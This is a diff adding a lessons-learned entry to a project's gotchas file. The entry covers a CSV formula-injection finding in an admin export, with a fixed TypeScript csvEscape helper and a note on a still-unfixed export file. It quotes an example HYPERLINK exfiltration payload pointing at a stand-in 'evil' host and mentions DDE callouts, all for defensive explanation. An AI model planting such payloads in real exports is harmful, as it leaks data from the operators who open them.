@@ -4,6 +4,53 @@ Things that broke, surprised us, or took >30 min to figure out. Add the moment y
 
 ---
 
+## CSV exports with UTF-8 BOM + user-controlled cells = formula-injection vector (Day 44 / PR #258 security review)
+
+**Symptom.** Day 44 PR #258 (super-admin disbursement CSV export) was flagged by automated security review with a MEDIUM CSV Formula Injection finding (CWE-1236) on the `csvEscape` helper. Fixed in PR #258 + 12 unit tests added.
+
+**Why it happens.** A malicious tenant could set `tenants.name = '=HYPERLINK("http://evil/exfil","Click")'`. When the super-admin downloads the CSV + opens in Excel/Sheets/LibreOffice, the spreadsheet renderer evaluates the cell as a formula. Common payloads: DDE callouts (`=cmd|...`), exfiltration via HYPERLINK to an attacker-controlled URL, or hidden-data-leakage via formulas that reference other cells in the workbook the operator might paste into.
+
+The UTF-8 BOM the project emits to make Excel-on-Windows render Bangla correctly is what **opts INTO** the spreadsheet renderer in the first place. Plain-text-renderer wouldn't fire the formula; BOM-prefixed CSV does.
+
+**Fix.** In any `csvEscape` helper, detect leading `=`, `+`, `-`, `@`, TAB, or CR and prefix the cell value with a single quote `'`. Excel + Sheets + LibreOffice all treat the leading apostrophe as a **display-only prefix** — it doesn't appear in the rendered cell, and the formula never fires. Then apply the standard RFC-4180 quoting if needed.
+
+Canonical pattern (from PR #258 + OWASP):
+
+```typescript
+const FORMULA_PREFIXES = /^[=+\-@\t\r]/
+const QUOTABLE = /[,"\r\n]/
+
+export function csvEscape(value: string | null | undefined): string {
+  if (value == null || value === '') return ''
+  const safe = FORMULA_PREFIXES.test(value) ? `'${value}` : value
+  if (QUOTABLE.test(safe)) return `"${safe.replace(/"/g, '""')}"`
+  return safe
+}
+```
+
+**How to avoid in future PRs.** ANY new code that:
+
+1. Joins user-controlled strings into a CSV/TSV row, AND
+2. Will be opened in a spreadsheet by an operator/tenant
+
+…must include the formula-prefix guard. The detection rule:
+
+- Greppable signal: any `csvEscape` / `csvRow` / `toCSV` helper that doesn't include `FORMULA_PREFIXES` or equivalent
+- File-level signal: any file matching `*csv*.ts` or `*export*.ts` that reads strings from `tenants`, `users`, `events`, `attendees`, `contact_submissions`, or any other table with user-controlled text columns
+- Output signal: any code emitting `'﻿'` (UTF-8 BOM) is opting into the spreadsheet renderer; the BOM and the formula-guard must ship together
+
+**Pre-existing same-vuln finding flagged for follow-up:**
+
+- `apps/api/src/services/attendees/export-csv.ts` — Day-32 work; identical `csvEscape` shape; emits BOM; reads `attendees.attendee_name` (user-controlled). **Vulnerable.** Not fixed in PR #258 (out of scope); needs a focused follow-up PR. The attack surface is "malicious attendee names cause formula execution in tenant's downloaded CSV"; lower priority than the disbursement export (tenant audience is less privileged than super-admin) but real.
+
+Trail:
+
+- PR #258 introduces the secure `csvEscape` in `apps/api/src/services/admin/disbursement-export.ts` with 12 unit tests
+- gotchas.md (this entry) consolidates the rule
+- Follow-up PR (not yet authored): apply the same fix to `apps/api/src/services/attendees/export-csv.ts` + add a matching test there
+
+---
+
 ## AWS Secrets Manager $0.40/secret/month compounds silently (Day 42 cost-ceiling audit)
 
 **Symptom.** Day 42 operator directive set a $30/month AWS budget. The cost audit revealed Secrets Manager alone was projected to consume ~$9/month at prod cutover (11 per-purpose entries × 2 envs × $0.40). Nobody tracked this number across Sprints 2-3 when entries were added one-at-a-time per the §17.9 per-purpose pattern (eps / database / oauth-google / oauth-apple / ses / sentry / jwt / redis / porichoy / ssl-wireless / cloudflare-saas).
